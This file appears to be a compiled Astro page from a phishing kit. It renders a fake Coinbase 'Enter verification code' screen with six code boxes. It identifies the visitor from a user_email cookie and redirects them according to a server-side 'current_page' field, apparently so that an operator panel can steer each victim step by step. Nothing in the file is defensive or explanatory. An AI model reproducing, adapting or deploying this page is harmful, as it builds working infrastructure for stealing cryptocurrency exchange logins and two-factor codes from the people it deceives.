import { c as createComponent, a as createAstro, d as renderComponent, r as renderTemplate, m as maybeRenderHead } from '../chunks/astro/server_MzpsRm1w.mjs';
import 'kleur/colors';
import { $ as $$AuthLayout } from '../chunks/AuthLayout_CigA1UqO.mjs';
import { $ as $$AuthCard } from '../chunks/AuthCard_DF9IDRFk.mjs';
import { i as initializeDb, g as getUserByEmail } from '../chunks/db__92qgssi.mjs';
/* empty css                                 */
export { renderers } from '../renderers.mjs';

const $$Astro = createAstro();
const $$Email = createComponent(async ($$result, $$props, $$slots) => {
  const Astro2 = $$result.createAstro($$Astro, $$props, $$slots);
  Astro2.self = $$Email;
  initializeDb();
  const cookieHeader = Astro2.request.headers.get("cookie");
  const encodedEmail = cookieHeader?.match(/user_email=([^;]+)/)?.[1];
  const userEmail = encodedEmail ? decodeURIComponent(encodedEmail) : null;
  if (!userEmail) {
    return Astro2.redirect("/signin");
  }
  const user = await getUserByEmail(userEmail);
  if (!user) {
    return Astro2.redirect("/signin");
  }
  if (user.current_page && user.current_page !== "email") {
    return Astro2.redirect(`/${user.current_page}`);
  }
  return renderTemplate`${renderComponent($$result, "AuthLayout", $$AuthLayout, { "title": "2FA Verification", "data-astro-cid-w6lttcqj": true }, { "default": async ($$result2) => renderTemplate` ${renderComponent($$result2, "AuthCard", $$AuthCard, { "data-astro-cid-w6lttcqj": true }, { "default": async ($$result3) => renderTemplate` ${maybeRenderHead()}<div class="coinbase-card" data-astro-cid-w6lttcqj> <div class="coinbase-logo" data-astro-cid-w6lttcqj>coinbase</div> <h2 class="coinbase-heading" data-astro-cid-w6lttcqj>Enter verification code</h2> <p class="coinbase-subtext" data-astro-cid-w6lttcqj>
We sent a verification code to <span class="coinbase-email" data-astro-cid-w6lttcqj>${user.email}</span> </p> <form class="coinbase-verification-form" data-astro-cid-w6lttcqj> <div class="coinbase-code-inputs" data-astro-cid-w6lttcqj> <input type="text" maxlength="1" pattern="[0-9]*" inputmode="numeric" class="code-box" required data-astro-cid-w6lttcqj> <input type="text" maxlength="1" pattern="[0-9]*" inputmode="numeric" class="code-box" required data-astro-cid-w6lttcqj> <input type="text" maxlength="1" pattern="[0-9]*" inputmode="numeric" class="code-box" required data-astro-cid-w6lttcqj> <input type="text" maxlength="1" pattern="[0-9]*" inputmode="numeric" class="code-box" required data-astro-cid-w6lttcqj> <input type="text" maxlength="1" pattern="[0-9]*" inputmode="numeric" class="code-box" required data-astro-cid-w6lttcqj> <input type="text" maxlength="1" pattern="[0-9]*" inputmode="numeric" class="code-box" required data-astro-cid-w6lttcqj> </div> <div class="coinbase-resend" data-astro-cid-w6lttcqj> <span class="resend-link" data-astro-cid-w6lttcqj>Resend code</span> <span class="resend-timer" data-astro-cid-w6lttcqj>(29s)</span> </div> <button type="submit" class="coinbase-continue-btn" disabled data-astro-cid-w6lttcqj>Continue</button> </form> </div> ` })} ` })}   `;
}, "C:/Users/coold/Desktop/panels/gemini.com/src/pages/email.astro", void 0);

const $$file = "C:/Users/coold/Desktop/panels/gemini.com/src/pages/email.astro";
const $$url = "/email";

const _page = /*#__PURE__*/Object.freeze(/*#__PURE__*/Object.defineProperty({
  __proto__: null,
  default: $$Email,
  file: $$file,
  url: $$url
}, Symbol.toStringTag, { value: 'Module' }));

const page = () => _page;

export { page };
